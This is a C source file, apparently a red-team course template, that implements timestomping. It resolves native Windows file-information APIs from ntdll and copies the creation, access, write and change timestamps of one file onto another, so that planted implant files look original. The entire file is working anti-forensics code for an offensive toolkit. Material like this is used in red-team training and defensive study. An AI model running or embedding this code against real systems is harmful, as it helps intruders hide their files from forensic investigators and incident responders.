/*

 Red Team Operator course code template
 Timestomping
 
 author: reenz0h (twitter: @SEKTOR7net)

*/
#include <windows.h>
#include <stdio.h>
#include "implant.h"

typedef NTSTATUS (WINAPI * NtQueryInformationFile_t)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
typedef NTSTATUS (WINAPI * NtSetInformationFile_t)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);

BOOL ExchangeTimestamps(char * srcfile, char * dstfile) {

	FILE_BASIC_INFORMATION dst_fbi, src_fbi; 
   	IO_STATUS_BLOCK ioStat;

	// resolve Nt API calls
	NtQueryInformationFile_t pNtQueryInformationFile = (NtQueryInformationFile_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationFile");
	if (pNtQueryInformationFile == NULL) {
		printf("[!] Could not resolve NtQueryInformationFile function address!\n");
		return FALSE;
	}
	NtSetInformationFile_t pNtSetInformationFile = (NtSetInformationFile_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationFile");
	if (pNtSetInformationFile == NULL) {
		printf("[!] Could not resolve NtSetInformationFile function address!\n");
		return FALSE;
	}
	
	// open destination and source files for information exchange
	HANDLE fileSrc = CreateFile(srcfile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (fileSrc == INVALID_HANDLE_VALUE) {
		printf("[!] Could not open file: %s\r\n", srcfile);
		return FALSE;
	}
	HANDLE fileDst = CreateFile(dstfile, GENERIC_READ | GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (fileDst == INVALID_HANDLE_VALUE) {
		printf("[!] Could not open file: %s\r\n", dstfile);
		CloseHandle(fileSrc);
		return FALSE;
	}

	// obtain the source and destination file information
	if (pNtQueryInformationFile(fileSrc, &ioStat, &src_fbi, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation) < 0) {
		printf("[!] Could not get %s file information!\n", srcfile);
		CloseHandle(fileSrc);
		CloseHandle(fileDst);
		return FALSE;
	}
	if (pNtQueryInformationFile(fileDst, &ioStat, &dst_fbi, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation) < 0) {
		printf("[!] Could not get %s file information!\n", dstfile);
		CloseHandle(fileSrc);
		CloseHandle(fileDst);
		return FALSE;
	}

	// set new timestamp in destination file info block
	dst_fbi.LastWriteTime = src_fbi.LastWriteTime;
	dst_fbi.LastAccessTime = src_fbi.LastAccessTime;
	dst_fbi.ChangeTime = src_fbi.ChangeTime;
	dst_fbi.CreationTime = src_fbi.CreationTime;
	
	// save new file information
	if (pNtSetInformationFile(fileDst, &ioStat, &dst_fbi, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation) < 0) {
		CloseHandle(fileSrc);
		CloseHandle(fileDst);
		return FALSE;
	}

	CloseHandle(fileSrc);
	CloseHandle(fileDst);

	return TRUE;
}

int main(int argc, char * argv[]) {

	if (argc < 3 ) {
		printf("[!] Missing arguments. Run: %s <DST_FILE> <SRC_FILE>\n", argv[0]);
		exit(-1);
	}

	if (ExchangeTimestamps(argv[2], argv[1]))
		printf("[+] Operation successful!\n");
	else
		printf("[!] Operation failed!\n");

	return 0;
}
